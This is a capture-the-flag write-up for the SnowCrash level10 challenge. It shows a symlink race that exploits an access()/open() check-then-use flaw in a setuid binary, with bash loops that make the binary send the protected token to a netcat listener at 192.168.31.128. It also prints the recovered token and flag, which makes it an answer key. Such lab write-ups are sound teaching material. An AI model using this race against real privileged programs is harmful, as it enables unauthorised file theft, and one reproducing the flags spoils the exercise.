```
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token

level10@SnowCrash:~$ cat token
cat: token: Permission denied

level10@SnowCrash:~$ ./level10
./level10 file host
        sends file to host if you have access to it

level10@SnowCrash:~$ strings level10
...
open
access
...
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
...
```
Output strings tell us to look as access function. There is an exploit (race condition) with `access` after `open`:
```
man access
Warning:  Using  access()  to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because
       the user might exploit the short time interval between checking and opening the file to manipulate it.  For this reason, the use of this system call  should  be
       avoided.   (In  the  example  just  described,  a  safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call
       open(2).)
```
So if we replace file by a symbolic link between `open` and `access` we can get token. To be sure let's do it in a loop:
```
level10@SnowCrash:~$ vim /tmp/lvl10.sh
level10@SnowCrash:~$ cat /tmp/lvl10.sh
#!/bin/bash

while :; do touch /tmp/tok; rm /tmp/tok; ln -s /home/user/level10/token /tmp/tok; rm /tmp/tok; done

level10@SnowCrash:~$ chmod 777 /tmp/lvl10.sh
level10@SnowCrash:~$ ls -la /tmp/lvl10.sh
-rwxrwxrwx 1 level10 level10 113 Sep 18 21:48 /tmp/lvl10.sh
```
Script to run `level10`:
```
level10@SnowCrash:~$ cat /tmp/send10.sh
#!/bin/bash

while :; do /home/user/level10/level10 /tmp/tok 192.168.31.128; done

```
Now, let's run out 2 scripts in separate windows and listen in third:
```
# one
level10@SnowCrash:~$ /tmp/lvl10.sh
# two
level10@SnowCrash:~$ ./level10 /tmp/tok 192.168.31.128
# three
level10@SnowCrash:~$ nc -lk 6969
```
On third window we get:
```
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
```
Getflag with this token:
```
level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
